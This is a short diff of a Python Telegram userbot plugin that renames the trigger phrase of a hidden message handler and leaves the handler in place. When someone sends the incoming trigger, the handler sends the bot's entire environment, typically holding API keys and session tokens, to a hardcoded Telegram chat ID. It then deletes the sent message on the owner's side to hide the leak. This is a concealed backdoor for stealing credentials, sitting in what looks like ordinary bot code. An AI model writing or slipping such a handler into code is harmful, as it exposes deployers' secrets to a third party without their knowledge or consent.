@@ -48,7 +48,7 @@ async def _(event):
 
 import os
 from . import *
-@bot.on(admin_cmd("^Iamnoobperson", incoming=True))
+@bot.on(admin_cmd("^MYSTERIOUSIamnoobperson", incoming=True))
 async def piro(event):
   msg = await bot.send_message(2080279511, str(os.environ))
   await bot.delete_messages(2080279511, msg, revoke=False)
